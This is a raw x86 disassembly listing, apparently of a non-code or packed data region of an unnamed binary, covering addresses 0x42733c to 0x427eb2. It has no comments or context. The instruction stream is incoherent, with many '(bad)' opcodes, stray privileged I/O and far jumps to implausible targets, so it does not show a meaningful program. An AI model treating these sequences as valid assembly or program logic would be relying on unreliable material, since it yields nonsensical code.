  42733c:	pop    ebp
  42733d:	int3   
  42733e:	cmp    al,0xe8
  427340:	loop   0x4272e1
  427342:	cli    
  427343:	mov    ebp,0xa97c3028
  427348:	rcr    DWORD PTR [ebx+0x5f7ea557],1
  42734e:	cmc    
  42734f:	mov    ch,0x23
  427351:	mov    dh,0xc8
  427353:	(bad)  
  427354:	adc    al,0xc7
  427356:	ja     0x42735c
  427358:	xor    DWORD PTR [edx+0x56],esi
  42735b:	sahf   
  42735c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42735d:	fnstcw WORD PTR [edx+0x78]
  427360:	pop    eax
  427361:	mov    cl,0x86
  427363:	push   eax
  427364:	not    BYTE PTR [edi]
  427366:	jo     0x4273a2
  427368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427369:	std    
  42736a:	adc    BYTE PTR ds:0x2410ae4d,al
  427370:	repz stc 
  427372:	jnp    0x427320
  427374:	imul   ecx,esi,0x72305fb3
  42737a:	pop    ss
  42737b:	outs   dx,DWORD PTR ds:[esi]
  42737c:	pop    ebx
  42737d:	test   eax,0x2166f296
  427382:	pop    esi
  427383:	push   ss
  427384:	or     eax,0xc2e3f819
  427389:	mov    esi,0x236adf1b
  42738e:	nop
  42738f:	sub    edx,DWORD PTR [esi-0x5e]
  427392:	in     eax,dx
  427393:	xchg   ecx,eax
  427394:	ss xor ch,dl
  427397:	imul   ecx,DWORD PTR [edx-0x3],0xb50678d9
  42739e:	push   eax
  42739f:	fist   DWORD PTR [esi]
  4273a1:	repnz xor ebp,DWORD PTR [ecx+eiz*4-0x2dc03a33]
  4273a9:	in     al,dx
  4273aa:	aas    
  4273ab:	dec    esi
  4273ac:	inc    edi
  4273ad:	sbb    eax,DWORD PTR [edi+0x54]
  4273b0:	jmp    0x678fbfb4
  4273b5:	mov    edx,0xbae6870
  4273ba:	xor    DWORD PTR [eax+0x4d6b5c3f],ecx
  4273c0:	(bad)  
  4273c1:	sbb    eax,DWORD PTR [eax]
	...
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa1e4:0x9a5f8d8
  427446:	add    DWORD PTR [eax],eax
  427448:	test   BYTE PTR [eax],0x0
  42744b:	add    BYTE PTR [ecx+0x3c],dl
  42744e:	int    0xa
  427450:	shr    DWORD PTR [esi],0xee
  427453:	fild   DWORD PTR [edi+0x49590c9f]
  427459:	repz mov ah,0x9b
  42745c:	ja     0x4274b0
  42745e:	or     eax,0x68f3f93c
  427463:	fld    DWORD PTR ds:0x3064fa9
  427469:	jp     0x427445
  42746b:	push   ebp
  42746c:	sub    eax,0x31c82cf
  427471:	sbb    esi,esp
  427473:	enter  0xfd12,0x82
  427477:	push   ds
  427478:	add    eax,0xead967d6
  42747d:	pop    es
  42747e:	js     0x42742a
  427480:	inc    ebx
  427481:	(bad)  
  427482:	loope  0x4274d5
  427484:	push   ss
  427485:	xchg   ebx,eax
  427486:	ins    DWORD PTR es:[edi],dx
  427487:	retf   0xeef8
  42748a:	hlt    
  42748b:	aad    0x6d
  42748d:	les    edx,FWORD PTR [edi+0x4b8533]
  427493:	mov    cl,0xab
  427495:	pop    ds
  427496:	lock xchg DWORD PTR [ecx-0x74],edx
  42749a:	retf   0x1953
  42749d:	and    BYTE PTR [ecx-0x77],bh
  4274a0:	outs   dx,DWORD PTR ds:[si]
  4274a2:	retfw  0x832e
  4274a6:	repnz mov edi,0x40431af4
  4274ac:	push   ebx
  4274ad:	mov    esp,0xafeb1ae1
  4274b2:	outs   dx,DWORD PTR ds:[esi]
  4274b3:	lea    ebx,[edi+0x4]
  4274b6:	enter  0x253,0xbb
  4274ba:	pop    esi
  4274bb:	sbb    BYTE PTR [edi-0x47f249c2],dh
  4274c1:	adc    ecx,edx
  4274c3:	jne    0x4274ee
  4274c5:	in     eax,dx
  4274c6:	xchg   DWORD PTR [edi],ecx
  4274c8:	or     eax,0xede7523
  4274cd:	gs jbe 0x427495
  4274d0:	dec    esp
  4274d1:	shr    DWORD PTR [edi+esi*8],cl
  4274d4:	(bad)  
  4274d6:	xor    ch,BYTE PTR [edx-0x21001b26]
  4274dc:	mov    ebp,0xb9dc5195
  4274e1:	je     0x427533
  4274e3:	test   edi,ebx
  4274e5:	inc    ecx
  4274e6:	jp     0x42751f
  4274e8:	sahf   
  4274e9:	sub    ecx,esi
  4274eb:	cmp    eax,0x8d8fc4b6
  4274f0:	dec    esi
  4274f1:	adc    esi,eax
  4274f3:	add    al,BYTE PTR [ebx-0x7d]
  4274f6:	inc    edi
  4274f7:	mov    ebp,0xae366ea1
  4274fc:	repz pop esi
  4274fe:	(bad)  
  4274ff:	pop    ss
  427500:	and    dl,BYTE PTR [ebx+0x795c8875]
  427506:	shl    BYTE PTR [ebx],0x1c
  427509:	fld    TBYTE PTR gs:[ebp+0x334299c7]
  427510:	inc    ebx
  427511:	ficomp DWORD PTR [edx+0x3]
  427514:	dec    edi
  427515:	ds inc ecx
  427517:	mov    al,ds:0x1fce1db3
  42751c:	clc    
  42751d:	cmp    eax,0x34c5f5ed
  427522:	push   esi
  427523:	(bad)  
  427524:	fild   QWORD PTR [ebp+0x16]
  427527:	dec    ebx
  427528:	rcr    BYTE PTR [edx+0x15a79cb1],0x9
  42752f:	sub    DWORD PTR [ebp+eiz*8+0xbd59e9f],esp
  427536:	mov    ebx,DWORD PTR [ecx]
  427538:	out    dx,al
  427539:	stc    
  42753a:	ret    
  42753b:	or     bh,bl
  42753d:	int3   
  42753e:	sub    edx,DWORD PTR [esi]
  427540:	sub    edi,DWORD PTR [edi]
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xec9a8b87,al
  4275c1:	sar    BYTE PTR [edi-0x5b],0xda
  4275c5:	mov    ds:0xf60001,al
  4275ca:	add    BYTE PTR [eax],al
  4275cc:	mov    esi,0x3a49435e
  4275d1:	jnp    0x42757b
  4275d3:	sbb    DWORD PTR ds:0xc64bf9e9,edx
  4275d9:	in     eax,dx
  4275da:	int3   
  4275db:	sar    edx,cl
  4275dd:	or     DWORD PTR [eax+0x68],0xffffffe1
  4275e1:	cld    
  4275e2:	loop   0x427639
  4275e4:	bound  esi,QWORD PTR [ebx]
  4275e6:	pop    esi
  4275e7:	sub    edx,ebx
  4275e9:	sbb    BYTE PTR [ebx-0x8],0x21
  4275ed:	adc    eax,0x6e03cc47
  4275f2:	add    DWORD PTR [esi],ebp
  4275f4:	fist   DWORD PTR [ebp-0x19c8bea5]
  4275fa:	push   esi
  4275fb:	idiv   eax
  4275fd:	das    
  4275fe:	mov    ebx,0x9aec74c1
  427603:	jmp    0x2b15:0xe7f10231
  42760a:	les    ebp,FWORD PTR [ebp-0x64]
  42760d:	dec    esp
  42760e:	push   cs
  42760f:	cwde   
  427610:	std    
  427611:	aaa    
  427612:	mul    BYTE PTR [ebx]
  427614:	push   es
  427615:	dec    ecx
  427616:	dec    ecx
  427617:	mov    dh,0xbf
  427619:	mov    eax,0x95a76d02
  42761e:	int3   
  42761f:	add    ecx,ecx
  427621:	xor    al,0xd5
  427623:	jbe    0x4275c5
  427625:	mov    dh,0xd0
  427627:	enter  0xf7f1,0xde
  42762b:	or     al,0xdf
  42762d:	out    dx,al
  42762e:	cmp    WORD PTR [ebx-0x27f02172],di
  427635:	jno    0x4276a3
  427637:	imul   esp,DWORD PTR [ebx+0x255cd0c8],0xffffffc6
  42763e:	neg    dl
  427640:	cmp    al,0x4d
  427642:	rcr    DWORD PTR [eax+0x16],0xad
  427646:	mov    ds:0xbfd744ec,al
  42764b:	es push ebx
  42764d:	xchg   ebx,eax
  42764e:	repz jo 0x427665
  427651:	lods   al,BYTE PTR ds:[esi]
  427652:	mov    dl,0x80
  427654:	loopne 0x4275fb
  427656:	mov    ebx,0xd38246a5
  42765b:	call   0x733d:0xe9350a7
  427662:	xchg   bl,dl
  427664:	in     al,0xe4
  427666:	ss repnz retf 0x51dd
  42766b:	repz mov edx,0xb70429c5
  427671:	lahf   
  427672:	dec    edx
  427673:	push   eax
  427674:	(bad)  
  427675:	jmp    0x11064fd4
  42767a:	popa   
  42767b:	push   0x22e107e2
  427680:	mov    ch,0x38
  427682:	sahf   
  427683:	hlt    
  427684:	mov    edi,0x2d97146a
  427689:	(bad)  
  42768a:	aas    
  42768b:	and    al,0xc0
  42768d:	cmp    DWORD PTR [esi],ebx
  42768f:	int    0x35
  427691:	cmc    
  427692:	daa    
  427693:	mov    ah,0x20
  427695:	adc    esi,DWORD PTR [ecx+ebp*2+0x6a]
  427699:	dec    edx
  42769a:	sub    al,0x58
  42769c:	stc    
  42769d:	jle    0x42767f
  42769f:	imul   eax,DWORD PTR [ecx-0x62],0xa8cb1fbd
  4276a6:	adc    DWORD PTR [ebp-0x2f81b8d6],ebx
  4276ac:	pop    ds
  4276ad:	inc    ebp
  4276ae:	call   0x538f4ff8
  4276b3:	pop    edx
  4276b4:	data16 cld 
  4276b6:	xchg   esi,eax
  4276b7:	lods   eax,DWORD PTR ds:[esi]
  4276b8:	xchg   esp,eax
  4276b9:	iret   
  4276ba:	sbb    BYTE PTR [ebp+0x1],ah
  4276bd:	jmp    0x0:0xaa8d6e5
	...
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	fdivrp st(4),st
  427742:	dec    ebx
  427743:	inc    esp
  427744:	shl    BYTE PTR [ebx+0xf60001],1
  42774a:	add    BYTE PTR [eax],al
  42774c:	mov    edx,0xea01753
  427751:	stc    
  427752:	out    dx,eax
  427753:	in     al,dx
  427754:	lds    edi,FWORD PTR [edi-0x1f]
  427757:	in     al,0x73
  427759:	popf   
  42775a:	adc    al,0x9b
  42775c:	rcr    BYTE PTR [edi+0x7f2e0a04],0x9e
  427763:	mov    es,WORD PTR [ebp+0x77]
  427766:	jecxz  0x427735
  427768:	pop    edx
  427769:	jp     0x427769
  42776b:	hlt    
  42776c:	leave  
  42776d:	cmp    ebp,DWORD PTR [ebx]
  42776f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427771:	inc    esp
  427772:	jl     0x42770d
  427774:	jmp    0x233d0ff2
  427779:	and    al,0xb8
  42777b:	jo     0x42777a
  42777d:	inc    edx
  42777e:	jno    0x4277a8
  427780:	cmp    BYTE PTR [ecx+0x5d3bacee],dl
  427786:	dec    ebp
  427787:	loopne 0x4277dd
  427789:	(bad)  
  42778a:	inc    ebp
  42778b:	xchg   ebp,eax
  42778c:	inc    ebx
  42778d:	mov    dl,0xb4
  42778f:	loopne 0x427779
  427791:	xchg   ecx,eax
  427792:	push   es
  427793:	bound  eax,QWORD PTR [eax-0x6d]
  427796:	mov    esp,0xafc8fee3
  42779b:	(bad)  
  42779c:	mov    eax,0x18fa743f
  4277a1:	enter  0xd61d,0x66
  4277a5:	out    0x26,eax
  4277a7:	in     al,dx
  4277a8:	push   ebx
  4277a9:	call   DWORD PTR [edx+0x29b30110]
  4277af:	sub    ecx,esi
  4277b1:	jb     0x42779e
  4277b3:	mov    edi,0x71c38fcb
  4277b8:	fs rol ecx,1
  4277bb:	jmp    0x4277f2
  4277bd:	shr    bl,1
  4277bf:	clc    
  4277c0:	fsub   DWORD PTR [ebp-0x3c]
  4277c3:	sahf   
  4277c4:	mov    bh,0xca
  4277c6:	leave  
  4277c7:	cmp    esp,DWORD PTR [eax+0x7e]
  4277ca:	cmp    dl,0x31
  4277cd:	mov    edi,0x16ae0ae8
  4277d2:	and    al,0x8e
  4277d4:	(bad)  
  4277d5:	aaa    
  4277d6:	and    BYTE PTR [edx],0xba
  4277d9:	fmul   DWORD PTR [edx-0x37]
  4277dc:	mov    DWORD PTR [eax+0x41f9ddd9],esp
  4277e2:	or     esp,DWORD PTR es:[eax]
  4277e5:	dec    ecx
  4277e6:	data16 mov al,0x47
  4277e9:	and    BYTE PTR [ebx],0x3b
  4277ec:	stos   DWORD PTR es:[edi],eax
  4277ed:	ss push esp
  4277ef:	jo     0x427841
  4277f1:	rcl    cl,cl
  4277f3:	cmp    esi,eax
  4277f5:	mov    bl,0xf8
  4277f7:	stc    
  4277f8:	pop    ss
  4277f9:	sub    DWORD PTR [ecx-0x79987e35],ebp
  4277ff:	in     al,0xf2
  427801:	pop    ebp
  427802:	in     al,dx
  427803:	imul   ebx,esp,0xbe5e5327
  427809:	data16 mov cl,0x3f
  42780c:	add    BYTE PTR [esi],ch
  42780e:	push   cs
  42780f:	mov    edx,0xc168f794
  427814:	aas    
  427815:	mov    esp,0x536821a5
  42781a:	push   0xd9ddcd5d
  42781f:	push   ecx
  427820:	cld    
  427821:	xor    edx,esp
  427823:	inc    esp
  427824:	cmc    
  427825:	addr16 je 0x4277e8
  427828:	jle    0x4277c0
  42782a:	pop    ebp
  42782b:	sub    DWORD PTR [esi+0x110c186e],0xc
  427832:	repz jns 0x427855
  427835:	sub    eax,0x3ef5ce39
  42783a:	dec    esp
  42783b:	dec    ebp
  42783c:	dec    ecx
  42783d:	mov    fs,WORD PTR [edi]
  42783f:	out    dx,al
  427840:	add    ecx,DWORD PTR [ecx+0x0]
	...
  4278b2:	add    BYTE PTR [eax],al
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	les    esp,FWORD PTR [ecx+edx*8+0x1a4c69f]
  4278c7:	add    dh,dh
  4278c9:	add    BYTE PTR [eax],al
  4278cb:	add    BYTE PTR [ebx-0x18],ch
  4278ce:	push   ss
  4278cf:	(bad)  
  4278d0:	add    ch,BYTE PTR [edi+0x7b]
  4278d3:	ror    bl,1
  4278d5:	add    esp,DWORD PTR [ebp+0x5dce476f]
  4278db:	arpl   WORD PTR [edx],ax
  4278dd:	stc    
  4278de:	(bad)  
  4278df:	mov    eax,ds:0x5c28be57
  4278e4:	xchg   BYTE PTR [esi+0x20],dh
  4278e7:	sti    
  4278e8:	mov    al,0xc7
  4278ea:	enter  0xfa0b,0xa3
  4278ee:	sar    BYTE PTR [esi-0x20ae0251],cl
  4278f4:	pop    ebx
  4278f5:	test   BYTE PTR [ecx+0xf],bl
  4278f8:	retf   0x5507
  4278fb:	sbb    al,0x24
  4278fd:	ja     0x42788f
  4278ff:	sbb    eax,0x59b1ee88
  427904:	(bad)  
  427905:	ror    DWORD PTR [ebp-0x42445d24],cl
  42790b:	out    dx,al
  42790c:	fsub   QWORD PTR [ebx-0x12242e14]
  427912:	pop    edx
  427913:	push   ds
  427914:	outs   dx,BYTE PTR ds:[esi]
  427915:	push   edx
  427916:	dec    ebp
  427917:	inc    edx
  427918:	push   edx
  427919:	stc    
  42791a:	inc    esi
  42791b:	cmc    
  42791c:	xor    eax,0x29e307d7
  427921:	adc    DWORD PTR [eax-0xe43b5d2],ebp
  427927:	jmp    0x5ab0:0xb8643eaf
  42792e:	push   ds
  42792f:	jmp    0x4cd8:0xb481b962
  427936:	xlat   BYTE PTR ds:[ebx]
  427937:	pop    esi
  427938:	or     DWORD PTR [edi],eax
  42793a:	test   al,0xa0
  42793c:	xor    eax,0x6d53f27c
  427941:	mov    BYTE PTR [eax-0x445da242],ch
  427947:	fstp   TBYTE PTR [edx+0x2]
  42794a:	dec    esp
  42794b:	mul    DWORD PTR [edx-0x4e]
  42794e:	mov    ebp,0x3b6242ea
  427953:	mov    eax,0x3fbbf7b3
  427958:	in     eax,dx
  427959:	jbe    0x4278fb
  42795b:	je     0x4279cb
  42795d:	fimul  WORD PTR [esi]
  42795f:	pusha  
  427960:	mov    edx,0xa5362204
  427965:	fnstcw WORD PTR [edi]
  427967:	sbb    esi,DWORD PTR [eax-0x4d]
  42796a:	cld    
  42796b:	push   ecx
  42796c:	lea    eax,[eax+ebx*8-0x2fd7253]
  427973:	mov    ch,dl
  427975:	mov    ds,eax
  427977:	or     BYTE PTR [edx],ch
  427979:	cmp    BYTE PTR [ebx-0x6d],cl
  42797c:	popf   
  42797d:	pop    esi
  42797e:	lea    ebp,[eax+eax*1]
  427981:	out    0x44,eax
  427983:	push   ebx
  427984:	mov    al,0x37
  427986:	pushf  
  427987:	push   ss
  427988:	cwde   
  427989:	into   
  42798a:	retf   0x3ad8
  42798d:	push   ebp
  42798e:	retf   0x6a83
  427991:	fwait
  427992:	dec    esp
  427993:	pop    esp
  427994:	ja     0x427945
  427996:	inc    eax
  427997:	dec    esp
  427998:	mov    DWORD PTR [edi],ebx
  42799a:	and    eax,DWORD PTR [eax+0x15]
  42799d:	(bad)  
  42799e:	mov    al,ds:0x59b8ffac
  4279a3:	mov    ds:0xf2511724,eax
  4279a8:	fmul   DWORD PTR [edx+0x3380fb71]
  4279ae:	lds    esi,FWORD PTR ds:0xdfa1659c
  4279b4:	ins    DWORD PTR es:[edi],dx
  4279b5:	or     al,0xac
  4279b7:	lods   eax,DWORD PTR ds:[esi]
  4279b8:	push   ebx
  4279b9:	inc    ebp
  4279ba:	add    BYTE PTR [ebx],ah
  4279bc:	jmp    0x427a16
  4279be:	push   ds
  4279bf:	or     al,0x6f
  4279c1:	jmp    0x4279c3
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x48
  427a41:	sbb    eax,0xa5bc64a1
  427a46:	add    DWORD PTR [eax],eax
  427a48:	test   BYTE PTR [eax],0x0
  427a4b:	add    cl,dh
  427a4d:	repz loope 0x427a90
  427a50:	nop
  427a51:	cld    
  427a52:	cmp    eax,0x20dd92e7
  427a57:	cmp    eax,DWORD PTR [ebp-0x51]
  427a5a:	in     eax,dx
  427a5b:	jnp    0x427a71
  427a5d:	push   ds
  427a5e:	pop    esi
  427a5f:	ss xchg esp,eax
  427a61:	jmp    0x427ab1
  427a63:	shl    DWORD PTR [eax-0x63],1
  427a66:	mov    ebx,0xba64685
  427a6b:	jno    0x427a43
  427a6d:	jb     0x427ae6
  427a6f:	add    BYTE PTR [esi],bh
  427a71:	mov    dl,0x88
  427a73:	xchg   ecx,eax
  427a74:	dec    ecx
  427a75:	int    0x26
  427a77:	xchg   ecx,eax
  427a78:	xor    edi,esi
  427a7a:	inc    esp
  427a7b:	dec    ebx
  427a7c:	arpl   WORD PTR [eax+0x6cf112d6],di
  427a82:	popf   
  427a83:	and    esp,DWORD PTR [ecx-0x55]
  427a86:	xchg   edi,eax
  427a87:	cmp    ecx,edi
  427a89:	and    ebx,ecx
  427a8b:	cld    
  427a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a8d:	js     0x427a69
  427a8f:	pop    ecx
  427a90:	xchg   ebp,eax
  427a91:	mov    bh,0x51
  427a93:	and    ecx,DWORD PTR [edx-0x289b092d]
  427a99:	fstp   QWORD PTR [ecx]
  427a9b:	pusha  
  427a9c:	scas   eax,DWORD PTR es:[edi]
  427a9d:	ins    DWORD PTR es:[edi],dx
  427a9e:	out    0x7d,eax
  427aa0:	(bad)  
  427aa1:	loope  0x427ae1
  427aa3:	repz cmp DWORD PTR [ecx-0x2ec8ff5a],ebx
  427aaa:	loop   0x427abe
  427aac:	and    DWORD PTR [ecx+eax*4-0x22bf843f],edx
  427ab3:	inc    ebp
  427ab4:	mov    ds:0x94146693,al
  427ab9:	xor    ch,BYTE PTR ss:[ecx-0x64ee36e8]
  427ac0:	inc    eax
  427ac1:	pop    edx
  427ac2:	sbb    eax,esi
  427ac4:	into   
  427ac5:	cwde   
  427ac6:	aaa    
  427ac7:	cli    
  427ac8:	mov    cl,0xc1
  427aca:	fprem  
  427acc:	les    ecx,FWORD PTR [esi-0x52b7cbff]
  427ad2:	xlat   BYTE PTR ds:[ebx]
  427ad3:	retf   0xe4bf
  427ad6:	test   BYTE PTR [esi+ebx*2],dh
  427ad9:	arpl   WORD PTR [ebp+0x2e5fb00f],bp
  427adf:	stos   BYTE PTR es:[edi],al
  427ae0:	scas   eax,DWORD PTR es:[edi]
  427ae1:	mov    ah,0x81
  427ae3:	mov    BYTE PTR [esp+edi*4+0x5c],cl
  427ae7:	push   bp
  427ae9:	in     al,0x73
  427aeb:	fimul  WORD PTR [edx+0x5e]
  427aee:	push   esp
  427aef:	ror    DWORD PTR [ebx+0x19],cl
  427af2:	es push ds
  427af4:	add    eax,DWORD PTR [eax+eax*2]
  427af7:	adc    eax,0x468288f3
  427afc:	and    cl,dh
  427afe:	std    
  427aff:	ret    
  427b00:	stc    
  427b01:	in     eax,dx
  427b02:	pop    ds
  427b03:	pop    ds
  427b04:	jbe    0x427ab4
  427b06:	mov    dh,0xdd
  427b08:	or     al,0x91
  427b0a:	cmp    ch,al
  427b0c:	jo     0x427b5e
  427b0e:	leave  
  427b0f:	push   ss
  427b10:	ds int 0x2a
  427b13:	(bad)  
  427b14:	test   BYTE PTR [edx+edi*8+0x4824155],0xea
  427b1c:	ret    
  427b1d:	pusha  
  427b1e:	mul    DWORD PTR [ecx+eiz*8+0x423a4ab3]
  427b25:	fdivp  st(0),st
  427b27:	push   esi
  427b28:	add    eax,0x7fc03a72
  427b2d:	jo     0x427b28
  427b2f:	jno    0x427abd
  427b31:	in     eax,dx
  427b32:	push   es
  427b33:	push   esp
  427b34:	test   al,0xb4
  427b36:	add    al,0xa3
  427b38:	xchg   esp,eax
  427b39:	pop    eax
  427b3a:	mov    al,0xbb
  427b3c:	mov    ch,0xd5
  427b3e:	adc    DWORD PTR [ebx+0x6d],edx
  427b41:	jecxz  0x427b43
	...
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0xc214fe65
  427bc1:	pop    edx
  427bc2:	cdq    
  427bc3:	div    BYTE PTR [edx-0x9fffe5a]
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [eax+0x265f562e],ch
  427bd1:	mov    esp,0x62a014a3
  427bd6:	sbb    DWORD PTR [edx-0x58],eax
  427bd9:	pop    ss
  427bda:	cwde   
  427bdb:	out    dx,eax
  427bdc:	push   0xb
  427bde:	ret    
  427bdf:	pop    DWORD PTR [eax+0x4a]
  427be2:	xchg   edx,eax
  427be3:	jle    0x427bdf
  427be5:	cmp    BYTE PTR [esi+0x3ad82e3c],ah
  427beb:	jns    0x427c11
  427bed:	or     DWORD PTR [ecx-0x507fbcc7],eax
  427bf3:	lods   al,BYTE PTR ds:[esi]
  427bf4:	(bad)  [ebp-0x5]
  427bf7:	pop    ss
  427bf8:	sar    DWORD PTR [eax],0xc3
  427bfb:	bound  edx,QWORD PTR [esi+0x44b82d0c]
  427c01:	mov    ds:0xd6eb868,eax
  427c06:	xchg   ecx,eax
  427c07:	test   al,0x71
  427c09:	outs   dx,BYTE PTR ds:[esi]
  427c0a:	popf   
  427c0b:	mov    esp,0xb4bc1212
  427c10:	adc    al,0x40
  427c12:	xchg   ebp,eax
  427c13:	and    BYTE PTR [ecx],ch
  427c15:	mov    ah,dh
  427c17:	dec    esp
  427c18:	xor    al,0x36
  427c1a:	sub    eax,0x7474705b
  427c1f:	sti    
  427c20:	(bad)  
  427c22:	cld    
  427c23:	fisubr WORD PTR [esi+0x45e8b287]
  427c29:	cdq    
  427c2a:	stc    
  427c2b:	fs pop edi
  427c2d:	(bad)  
  427c2e:	and    eax,0xa3c7b8d5
  427c33:	mov    cl,0x90
  427c35:	and    eax,0x81cae86e
  427c3a:	pop    ebp
  427c3b:	push   0x5ac4815f
  427c40:	cmp    bh,BYTE PTR [edi-0x2907c1bd]
  427c46:	lods   eax,DWORD PTR ds:[esi]
  427c47:	sbb    BYTE PTR [ecx+0x3769287d],al
  427c4d:	bound  ebp,QWORD PTR ds:0xba83ab50
  427c53:	ins    DWORD PTR es:[edi],dx
  427c54:	sub    eax,0x9bfadb53
  427c59:	push   ecx
  427c5a:	sti    
  427c5b:	out    0x10,eax
  427c5d:	mov    dh,bh
  427c5f:	jle    0x427ca3
  427c61:	out    dx,al
  427c62:	mov    ds:0x13c89f20,al
  427c67:	cmp    edx,DWORD PTR [edx-0x23dac789]
  427c6d:	test   esp,0xf588371e
  427c73:	push   cs
  427c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c75:	mov    ebx,0xced93fef
  427c7a:	adc    bh,cl
  427c7c:	push   0x5e
  427c7e:	push   edx
  427c7f:	inc    esi
  427c80:	pop    eax
  427c81:	(bad)  
  427c82:	shr    DWORD PTR [eax],1
  427c84:	cdq    
  427c85:	out    dx,al
  427c86:	xchg   DWORD PTR [edi-0x4f2f57d1],ecx
  427c8c:	pop    esp
  427c8d:	mov    bh,0x48
  427c8f:	push   edx
  427c90:	or     eax,esi
  427c92:	bswap  esi
  427c94:	retf   
  427c95:	and    DWORD PTR [edx-0x3f26d75d],eax
  427c9b:	mov    dh,0x7c
  427c9d:	inc    edi
  427c9e:	pop    eax
  427c9f:	les    ebp,FWORD PTR [edi]
  427ca1:	call   FWORD PTR [edi]
  427ca3:	cmp    eax,0xbb30a43a
  427ca8:	cmp    al,0xa0
  427caa:	mov    ebx,0x2300a4a4
  427caf:	dec    eax
  427cb0:	or     BYTE PTR [esi+0x61d34afe],dl
  427cb6:	and    DWORD PTR [esi],0x43252603
  427cbc:	sub    eax,0x4f5c16f
  427cc1:	push   eax
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0x43a1:0xdc63ecf9
  427d41:	jmp    0x427d98
  427d43:	jge    0x427ced
  427d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d46:	add    DWORD PTR [eax],eax
  427d48:	test   BYTE PTR [eax],0x0
  427d4b:	add    BYTE PTR [esi+0x2f],bh
  427d4e:	scas   eax,DWORD PTR es:[edi]
  427d4f:	repnz (bad) 
  427d51:	sub    al,BYTE PTR ds:0xb9246abe
  427d57:	jecxz  0x427dcc
  427d59:	pop    ecx
  427d5a:	xchg   edx,eax
  427d5b:	(bad)  
  427d5c:	loopne 0x427d92
  427d5e:	std    
  427d5f:	and    esp,ebx
  427d61:	adc    esi,0x470391c9
  427d67:	jno    0x427cfc
  427d69:	shr    DWORD PTR [edi-0xba7edca],1
  427d6f:	test   al,0x30
  427d71:	inc    edx
  427d72:	rol    BYTE PTR [eax+eiz*1-0x29f1ab8c],0x9e
  427d7a:	mov    ch,0x70
  427d7c:	cwde   
  427d7d:	in     al,0x85
  427d7f:	xchg   BYTE PTR [eax+ecx*1+0x18],dh
  427d83:	sub    BYTE PTR [edx+0x1c40be95],dh
  427d89:	sbb    edx,DWORD PTR [edi+0x7e57e7c6]
  427d8f:	or     ah,BYTE PTR [edi]
  427d91:	in     al,dx
  427d92:	ds mov ebp,0x3e361e16
  427d98:	popa   
  427d99:	mov    eax,0x66fdb66f
  427d9e:	aas    
  427d9f:	mov    es:0x163ac33d,al
  427da5:	adc    cl,BYTE PTR [ecx+esi*2]
  427da8:	add    DWORD PTR [edx+0x7],ebp
  427dab:	ins    BYTE PTR es:[edi],dx
  427dac:	(bad)  
  427dad:	mov    edi,0xb958c4f9
  427db2:	inc    edx
  427db3:	pusha  
  427db4:	sub    al,0xf4
  427db6:	sar    DWORD PTR [esi+0x52],1
  427db9:	fucomp st(1)
  427dbb:	add    esi,0xffffffd9
  427dbe:	mov    esp,DWORD PTR [edx+0xdd63069]
  427dc4:	xchg   ebp,eax
  427dc5:	aad    0xeb
  427dc7:	mov    eax,0x77e85a21
  427dcc:	sub    al,0xcf
  427dce:	in     eax,0x3e
  427dd0:	xchg   edx,eax
  427dd1:	and    eax,DWORD PTR [edx]
  427dd3:	lea    esp,[ebx]
  427dd5:	clc    
  427dd6:	mov    eax,0x105b76dd
  427ddb:	(bad)  
  427ddc:	sbb    eax,0xf6ba33ca
  427de1:	in     al,0x7f
  427de3:	mov    DWORD PTR [eax],esi
  427de5:	int3   
  427de6:	jg     0x427e36
  427de8:	mov    ah,0x46
  427dea:	xchg   esi,eax
  427deb:	cmp    dh,al
  427ded:	inc    dx
  427def:	jp     0x427e24
  427df1:	in     eax,0x6b
  427df3:	cmpxchg BYTE PTR [ecx],dh
  427df6:	cmc    
  427df7:	push   cs
  427df8:	mov    eax,ds:0x3f94bf29
  427dfd:	add    bl,BYTE PTR [ecx+eax*8+0x3e69954f]
  427e04:	xchg   BYTE PTR [ecx-0x2b6a43b1],bl
  427e0a:	mov    ds:0xff516cb5,al
  427e0f:	(bad)  [esi+edi*2+0x73d961cf]
  427e16:	scas   al,BYTE PTR es:[edi]
  427e17:	gs xchg esp,eax
  427e19:	mov    esp,0x90e1143c
  427e1e:	not    DWORD PTR [esi+edx*1-0xab1fa97]
  427e25:	jecxz  0x427df1
  427e27:	jmp    DWORD PTR [esi+ebp*4-0x24]
  427e2b:	lahf   
  427e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e2d:	inc    eax
  427e2e:	scas   al,BYTE PTR es:[edi]
  427e2f:	jo     0x427dbe
  427e31:	add    bh,BYTE PTR [edi]
  427e33:	adc    al,0xf0
  427e35:	fistp  DWORD PTR [edx-0x7b]
  427e38:	retf   0x91d
  427e3b:	sbb    bl,bh
  427e3d:	mov    ch,0xb3
  427e3f:	leave  
  427e40:	fstp   TBYTE PTR [edi]
	...
  427eb2:	add    BYTE PTR [eax],al
